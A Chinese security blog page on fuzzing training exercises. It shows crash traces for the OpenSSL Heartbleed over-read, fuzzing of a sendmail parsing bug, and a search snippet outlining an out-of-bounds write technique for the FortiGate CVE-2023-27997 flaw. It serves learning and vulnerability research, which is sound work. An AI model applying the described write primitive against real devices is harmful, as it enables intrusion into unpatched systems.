==7701==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x5555556f96d7 bp 0x7fffffffd4d0 sp 0x7fffffffcca0
READ of size 25648 at 0x629000009748 thread T0
[Attaching after Thread 0x7ffff7e99800 (LWP 7701) fork to child process 7704]
[New inferior 2 (process 7704)]
[Detaching after fork from parent process 7701]
[Inferior 1 (process 7701) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
process 7704 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
    #0 0x5555556f96d6 in __asan_memcpy (/home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a56d6) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)
    #1 0x555555744ca1 in tls1_process_heartbeat /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/t1_lib.c:2586:3
    #2 0x5555557b9129 in ssl3_read_bytes /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_pkt.c:1092:4
    #3 0x5555557bdcd9 in ssl3_get_message /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_both.c:457:7
    #4 0x555555786696 in ssl3_get_client_hello /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_srvr.c:941:4
    #5 0x5555557823ec in ssl3_accept /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_srvr.c:357:9
    #6 0x555555737a7f in main /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/./handshake.cc:53:3
    #7 0x7ffff7829d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #8 0x7ffff7829e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #9 0x555555677564 in _start (/home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x123564) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)

0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748)
allocated by thread T0 here:
    #0 0x5555556fa3ae in malloc (/home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a63ae) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)
    #1 0x5555557f0ee9 in CRYPTO_malloc /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/crypto/mem.c:308:8

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a56d6) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=&gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa
  0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7701==ABORTING
[Inferior 2 (process 7704) exited normally]
</code></pre>
<p>定位到<code>t1_lib.c</code>中的<code>tls1_process_heartbeat</code>的<code>memcpy(bp, pl, payload);</code>即是触发心脏滴血的关键代码</p>
<pre><code class="language-bash">*RIP  0x555555744c9d (tls1_process_heartbeat+765) ◂— call 0x5555556f9520
────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
   0x555555744c89 &lt;tls1_process_heartbeat+745&gt;    jne    tls1_process_heartbeat+1249                &lt;tls1_process_heartbeat+1249&gt;
 
   0x555555744c8f &lt;tls1_process_heartbeat+751&gt;    mov    byte ptr [rbx + 2], r12b
   0x555555744c93 &lt;tls1_process_heartbeat+755&gt;    lea    rdi, [rbx + 3]
   0x555555744c97 &lt;tls1_process_heartbeat+759&gt;    mov    rsi, r15
   0x555555744c9a &lt;tls1_process_heartbeat+762&gt;    mov    rdx, rbp
 ► 0x555555744c9d &lt;tls1_process_heartbeat+765&gt;    call   __asan_memcpy                &lt;__asan_memcpy&gt;
        rdi: 0x62b000000203 ◂— 0xbebebebebebebebe
        rsi: 0x62900000520b ◂— 0xbebebebebebebebe
        rdx: 0x6430
        rcx: 0x55555662f720 (__afl_area_initial) ◂— 0x1000000000002
 
   0x555555744ca2 &lt;tls1_process_heartbeat+770&gt;    lea    rdi, [rbx + rbp]
   0x555555744ca6 &lt;tls1_process_heartbeat+774&gt;    add    rdi, 3
   0x555555744caa &lt;tls1_process_heartbeat+778&gt;    mov    esi, 0x10
   0x555555744caf &lt;tls1_process_heartbeat+783&gt;    call   RAND_pseudo_bytes                &lt;RAND_pseudo_bytes&gt;
 
   0x555555744cb4 &lt;tls1_process_heartbeat+788&gt;    mov    rdi, qword ptr [rsp + 0x10]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
In file: /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/t1_lib.c
   2581                 bp = buffer;
   2582                 
   2583                 /* Enter response type, length and copy payload */
   2584                 *bp++ = TLS1_HB_RESPONSE;
   2585                 s2n(payload, bp);
 ► 2586                 memcpy(bp, pl, payload);
   2587                 bp += payload;
   2588                 /* Random padding */
   2589                 RAND_pseudo_bytes(bp, padding);
   2590 
   2591                 r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd4e0 —▸ 0xc34000001b0 ◂— 0x0
01:0008│     0x7fffffffd4e8 —▸ 0x6180000000f0 ◂— 0x0
02:0010│     0x7fffffffd4f0 —▸ 0x618000000080 ◂— 0x200000000301
03:0018│     0x7fffffffd4f8 ◂— 0x644300005203
04:0020│     0x7fffffffd500 —▸ 0x618000000118 ◂— 0x0
05:0028│     0x7fffffffd508 —▸ 0x7fffffffd640 ◂— 0x3fff800
06:0030│     0x7fffffffd510 —▸ 0x7fffffffd540 ◂— 0x41b58ab3
07:0038│     0x7fffffffd518 —▸ 0xc34000001b6 ◂— 0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x555555744c9d tls1_process_heartbeat+765
   1   0x5555557b912a ssl3_read_bytes+13306
   2   0x5555557bdcda ssl3_get_message+538
   3   0x555555786697 ssl3_get_client_hello+535
   4   0x5555557823ed ssl3_accept+3405
   5   0x555555737a80 main+448
   6   0x7ffff7829d90 __libc_start_call_main+128
   7   0x7ffff7829e40 __libc_start_main+128
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; ni
=================================================================
==8348==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x5555556f96d7 bp 0x7fffffffd4d0 sp 0x7fffffffcca0
READ of size 25648 at 0x629000009748 thread T0
[Attaching after Thread 0x7ffff7e99800 (LWP 8348) fork to child process 8359]
[New inferior 2 (process 8359)]
[Detaching after fork from parent process 8348]
[Inferior 1 (process 8348) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
process 8359 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
Warning:
Cannot insert breakpoint 2.
Cannot access memory at address 0x5555557b9125
</code></pre>
<h2 id="sendmail_1301">sendmail_1301:</h2>
<h3 id="前言-3">前言：</h3>
<p>本文为afl-training的第三篇，针对<code>sendmail</code>的fuzz，比较了一下普通harness普通fuzz与并行fuzz的效率提升，以及普通harness与优化过后的harness进行fuzz时的效率差别</p>
<h3 id="准备工作-3">准备工作：</h3>
<p>这道题已经准备好了<code>harness</code><br>
根据<code>makefile</code>：</p>
<pre><code class="language-makefile">CFLAGS ?= -g

m1-bad: mime1-bad.c main.c
	${CC} ${CFLAGS} -o m1-bad mime1-bad.c main.c -I .

clean:
	rm -f *-bad *-ok
</code></pre>
<p>我们设置环境变量<code>export CC=afl-clang-fast</code>后make即可<br>
生成<code>m1-bad</code>，测试一下能正常运行</p>
<pre><code class="language-bash">fk@fk-pop:~/文档/fuzzing/afl-training/challenges/sendmail/1301$ ./m1-bad 1.txt 
buf-obuf=64
obp-obuf=0
canary-obuf=4294967268
canary = GOOD
obuf = 1

canary should be GOOD
canary = GOOD
</code></pre>
<h3 id="fuzzing-2">Fuzzing:</h3>
<p>建好文件夹和生成随机种子之后开始fuzz</p>
<pre><code>afl-fuzz -i ipt/ -o opt/ -- ./m1-bad @@
</code></pre>
<p>没有修改过的<code>harness</code>编译出的进行fuzz时表现如下：<br>
<img src="https://oraclepi.tech/post-images/1696660225566.png" alt="" loading="lazy"><br>
在3min左右的时候跑出了crash；</p>
<p>然后我们使用并行fuzz：</p>
<pre><code>afl-fuzz -i ipt1/ -o opt1/ -M f1 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f2 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f3 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f4 -- ./m1-bad @@
</code></pre>
<p>这次我们不到1min主fuzzer就跑出了crash：<br>
<img src="https://oraclepi.tech/post-images/1696660232590.png" alt="" loading="lazy"></p>
<p>最后我们测试一下延迟初始化和持久化模式需要多久能跑出,修改一下harness:</p>
<pre><code class="language-c">#include &quot;my-sendmail.h&quot;
#include &lt;assert.h&gt;

int main(int argc, char **argv)
{

     HDR *header;
     register ENVELOPE *e;
     FILE *temp;

     #ifdef __AFL_HAVE_MANUAL_CONTROL
     __AFL_INIT();
     #endif 
     while(__AFL_LOOP(1000))
     {
          assert(argc == 2);
          temp = fopen(argv[1], &quot;r&quot;);
          assert(temp != NULL);

          header = (HDR *)malloc(sizeof(struct header));

          header-&gt;h_field = &quot;Content-Transfer-Encoding&quot;;
          header-&gt;h_value = &quot;quoted-printable&quot;;
          header-&gt;h_link = NULL;
          header-&gt;h_flags = 0;

          e = (ENVELOPE *)malloc(sizeof(struct envelope));
          e-&gt;e_id = &quot;First Entry&quot;;
          e-&gt;e_dfp = temp;


          mime7to8(header, e);

          fclose(temp);
          free(e);
          free(header);
          return 0;
     }
}
</code></pre>
<p>重新make后进行fuzz：<br>
<img src="https://oraclepi.tech/post-images/1696660239113.png" alt="" loading="lazy"><br>
在2min30s左右跑出crash，相较于最原始的harness还是有效率提升的</p>
<h3 id="crash分析-3">crash分析：</h3>
<p>使用<code>afl-tmin</code>精简样本：</p>
<pre><code class="language-bash">for i in id*;do afl-tmin -i $i -o ./tmp/$i  -- ./m1-bad @@;done;
</code></pre>
<p>得到简化后样本</p>
<pre><code class="language-bash">fk@fk-pop:~/文档/fuzzing/afl-training/challenges/sendmail/1301/opt1/f1/crashes/tmp$ hexdump -C id\:000000\,sig\:11\,src\:000038\,time\:3687\,execs\:21373\,op\:havoc\,rep\:1 
00000000  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000230  30 30 30 30 30 30 30 30  30 30 30 3d 0a 30 30 30  |00000000000=.000|
00000240  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000260  30 30 30 3d 0a 30 30 30  30 30 30                 |000=.000000|
0000026b
</code></pre>
<p>后用<code>AFL_USE_ASAN=1</code>的编译选项重新编译了一份之后跑样本确定crash发生处确实与给出的<code>mime1-bad.c</code>中注释<code>BAD</code>的地方吻合</p>
<pre><code class="language-bash">==2927476==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffdc92 at pc 0x555555631800 bp 0x7fffffffdbb0 sp 0x7fffffffdba8
WRITE of size 1 at 0x7fffffffdc92 thread T0
[Attaching after Thread 0x7ffff7e9cc40 (LWP 2927476) fork to child process 2927479]
[New inferior 2 (process 2927479)]
[Detaching after fork from parent process 2927476]
[Inferior 1 (process 2927476) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
process 2927479 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
    #0 0x5555556317ff in mime_fromqp /home/fk/文档/fuzzing/afl-training/challenges/sendmail/1301/mime1-bad.c:248:18
    #1 0x5555556317ff in mime7to8 /home/fk/文档/fuzzing/afl-training/challenges/sendmail/1301/mime1-bad.c:156:7
    #2 0x5555556323c6 in main /home/fk/文档/fuzzing/afl-training/challenges/sendmail/1301/main.c:94:11
    #3 0x7ffff7c29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #4 0x7ffff7c29e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #5 0x5555555733f4 in _start (/home/fk/文档/fuzzing/afl-training/challenges/sendmail/1301/opt/default/crashes/m1-bad+0x1f3f4) (BuildId: 774480b07edb24c4f93faf62426d5928c809433f)
</code></pre>
<h2 id="小结">小结：</h2>
<p>以上为afl-training几个具有代表性的练习，帮助熟悉afl++的fuzz流程，现整合为1篇</p>

            </div>
            
            
              <div class="post-footer">
  <div class="tags">
    
      <a href="https://oraclepi.tech/tag/cwoqnEuqX/"># fuzz</a>
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="近期一些题" href="https://oraclepi.tech/post/cMQySKj3Y/">近期一些题</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="近期一些题" href="https://oraclepi.tech/post/cMQySKj3Y/">上一篇</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="Fuzzing Module" href="https://oraclepi.tech/post/5Wt1I5xiU/">Fuzzing Module</a>
        <a class="nav-mobile-next" title="Fuzzing Module" href="https://oraclepi.tech/post/5Wt1I5xiU/">下一篇</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <center id="runTimeBox">
      已运行:<span id="run_time"></span>
    </center>
    <span id="busuanzi_container_site_pv">浏览数:<span id="busuanzi_value_site_pv"></span></span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">访客数:<span id="busuanzi_value_site_uv"></span></span>

    <script>
      BirthDay = new Date('');
      if (BirthDay.getTime()) {
        function runTime() {
          str = "";
          today = new Date();
          timeold = today.getTime() - BirthDay.getTime();
          msPerDay = 24 * 60 * 60 * 1000;
          e_daysold = timeold / msPerDay;
          daysold = Math.floor(e_daysold);
          str += daysold + "天";
          return str;
        }
        setInterval(function () {
          $("#run_time").html(runTime());
        }, 1000);
      } else {
        document.querySelector('.footer').removeChild(document.querySelector('#runTimeBox'));
      }
    </script>
    <div class="poweredby">
      💤💤💤
    </div>
  </footer>
  
    
      <div class="drawer-box right" id="drawer_box">
        <span class="muse-line muse-line-first"></span>
        <span class="muse-line muse-line-middle"></span>
        <span class="muse-line muse-line-last"></span>
      </div>
      
        <div class="mist back-to-top" id="back_to_top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
        
                  
                        
</div>
<script>
  let sideBarOpen = "sidebar-open";
  let body = document.body;
  let back2Top = document.querySelector("#back_to_top"),
    back2TopText = document.querySelector("#back_to_top_text"),
    drawerBox = document.querySelector("#drawer_box"),
    rightSideBar = document.querySelector(".sidebar"),
    viewport = document.querySelector("body");

  function scrollAnimation(currentY, targetY) {
    let needScrollTop = targetY - currentY;
    let _currentY = currentY;
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10);
      _currentY += dist;
      window.scrollTo(_currentY, currentY);
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY);
      } else {
        window.scrollTo(_currentY, targetY);
      }
    }, 1);
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener("scroll", function (e) {
    let percent =
      (document.scrollingElement.scrollTop /
        (document.scrollingElement.scrollHeight -
          document.scrollingElement.clientHeight)) *
      100;
    if (percent > 1 && !back2Top.classList.contains("back-top-active")) {
      back2Top.classList.add("back-top-active");
    }
    if (percent == 0) {
      back2Top.classList.remove("back-top-active");
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });

  let hasCacu = false;
  window.addEventListener("resize", function (e) {
    calcuHeight();
  });

  function calcuHeight() {
    // 动态调整站点概览高度
    if (
      (!hasCacu && back2Top.classList.contains("pisces")) ||
      back2Top.classList.contains("gemini")
    ) {
      let sideBar = document.querySelector(".sidebar");
      let navUl = document.querySelector("#site_nav");
      sideBar.style =
        "margin-top:" + (navUl.offsetHeight + navUl.offsetTop + 15) + "px;";
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false,
    MOTION_TIME = 300,
    RIGHT_MOVE_DIS = "320px";

  if (drawerBox) {
    let rightMotions = document.querySelectorAll(".right-motion");
    let right = drawerBox.classList.contains("right");

    let transitionDir = right
      ? "transition.slideRightIn"
      : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingRight: "0px",
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingLeft: "0px",
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      jQuery.Velocity(rightSideBar, "stop");
      jQuery.Velocity(viewport, "stop");
      jQuery.Velocity(rightMotions, "stop");
      if (open) {
        jQuery.Velocity(
          rightSideBar,
          {
            width: RIGHT_MOVE_DIS,
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, transitionDir, {});
            },
          }
        );
        jQuery.Velocity(viewport, openProp, {
          duration: MOTION_TIME,
        });
      } else {
        jQuery.Velocity(
          rightSideBar,
          {
            width: "0px",
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, {
                opacity: 0,
              });
            },
          }
        );
        jQuery.Velocity(viewport, closeProp, {
          duration: MOTION_TIME,
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle("muse-line");
      }
      drawerBox.classList.toggle(sideBarOpen);
    };
  }

  // 链接跳转
  let newWindow = "true";
  if (newWindow === "true") {
    let links = document.querySelectorAll(".post-body a");
    links.forEach((item) => {
      if (!item.classList.contains("btn")) {
        item.setAttribute("target", "_blank");
      }
    });
  }

  let faSearch = document.querySelector("#fa_search");
  faSearch &&
    faSearch.addEventListener("click", function () {
      document.querySelector("#search_mask").style = "";
    });

  // 代码高亮
  hljs.initHighlightingOnLoad();

  // 离开当前页title变化
  var leaveTitle = "";
  var normal_title = document.title;
  if (leaveTitle) {
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState == "hidden") {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }
</script>

<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
<script src="/media/js/jquery.fancybox.js"></script>

<script>
  let images = document.querySelectorAll(".section img");
  images.forEach((image) => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement("a");
    aelem.href = image.src;
    aelem.dataset["fancybox"] = "images";
    aelem.dataset["rel"] = "fancybox-button";
    aelem.classList.add("fancybox");
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  });
</script>
    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>感谢您的支持，我会继续努力的!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">扫码打赏，你说多少就多少</p>
      <p class="reward-tip"> </p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        jQuery.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        jQuery.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        jQuery.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        jQuery.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      jQuery.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      jQuery.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

  <div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="搜索">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">条相关条目，使用了</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">毫秒</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JJwpNhAOx/"" data-c="
          &lt;p&gt;本文复现CVE-2023-27997，版本v7.2.1.F-build1254&lt;br&gt;
环境搭建见上一篇&lt;/p&gt;
&lt;h2 id=&#34;漏洞信息&#34;&gt;漏洞信息:&lt;/h2&gt;
&lt;p&gt;sslvpn在&lt;code&gt;/remote/hostcheck_validate&lt;/code&gt;和&lt;code&gt;/remote/logincheck&lt;/code&gt;端点中解码 URL 参数时进行了不正确的大小检查&lt;br&gt;
请求中的enc参数会传入&lt;code&gt;parse_enc_data&lt;/code&gt;，enc结构如下图包含了seed, size, ciphertext三部分&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240825194540.png&#34; alt=&#34;Pasted image 20240825194540.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先有一个check检测传入的enc长度是否大于11并且为偶数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;  in_len = v4;
  lenofData = v4;
  if ( v4 &amp;lt;= 11 || (v4 &amp;amp; 1) != 0 )
  {
    sub_16CFA20(a1, 8, (unsigned int)&amp;quot;enc data length invalid (%d)\n&amp;quot;, v4, v5, v6);
    return 0xFFFFFFFFLL;
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;满足check条件后会分配一块&lt;code&gt;strlen(enc)/2+1&lt;/code&gt;的缓冲区&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;v25 = (_BYTE *)fsv_malloc(*a2, (in_len &amp;gt;&amp;gt; 1) + 1);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;并将传过去的数据转换为16进制字节流的形式，例如将&lt;code&gt;01020a0d&lt;/code&gt;字符串转换为&lt;code&gt;\x01\x02\x0a\x0d&lt;/code&gt;存储在buffer中，这也是为什么buffer按 &lt;code&gt;enc长度/2 +1&lt;/code&gt; 分配&lt;/p&gt;
&lt;p&gt;后续会进入另一个边界check，将enc参数长度与的enc_size（payloadLength）比较，如果传入的长度-5大于定义的长度即可pass&lt;br&gt;
这里本来应该将分配的缓冲区的大小跟这里的payloadLength比较，但是实际上将传入的参数长度与定义长度比较，&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if ( in_len - 5 &amp;lt;= (unsigned __int16)payloadLength )
      {
        sub_16CFA20(
          a1,
          8,
          (unsigned int)&amp;quot;invalid enc data length: %d\n&amp;quot;,
          (unsigned __int16)payloadLength,
          (unsigned __int16)payloadLength,
          v10);
        return 1LL;
      }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;构造堆块大小&amp;lt;payloadLength&amp;lt;in_len-5可以绕过if进入漏洞利用处，由于payloadLength大于堆块大小，可以越界写，不过每次xor会有脏数据&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;        v16 = v12 + 6;
        v25 = v16;
        if ( (_WORD)payloadLength )
        {
          v17 = (unsigned int)(unsigned __int16)payloadLength - 1;
          v18 = 0LL;
          v19 = 2;
          while ( 1 )
          {
            v16[v18] ^= v28[v19];
            if ( v17 == v18 )
              break;
            v19 = ((_BYTE)v18 + 3) &amp;amp; 0xF;
            if ( (((_BYTE)v18 + 3) &amp;amp; 0xF) == 0 )
            {
              v24 = payloadLength;
              MD5_Init(v27);
              MD5_Update(v27, v28, 16LL);
              MD5_Final(v28, v27);
              payloadLength = v24;
            }
            v16 = v25;
            ++v18;
          }
          v16 = &amp;amp;v25[(unsigned __int16)payloadLength];
        }
        *v16 = 0; // off-by-null
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而这里每次末尾会置null，这篇文章给出了一个越界写原语:&lt;br&gt;
https://blog.lexfo.fr/xortigate-cve-2023-27997.html&lt;br&gt;
即利用两次xor值不变的方式来写数据，如下图&lt;br&gt;
第一次写4999处的数据，会在5000处置0&lt;br&gt;
第二次在5000处进行xor的时候就可以写想要的字节，并在5001处置0...&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240827165003.png&#34; alt=&#34;Pasted image 20240827165003.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用以下payload发送，可以创建一个0x1000大小的堆块，此时in_len大概是0x1fcx&lt;br&gt;
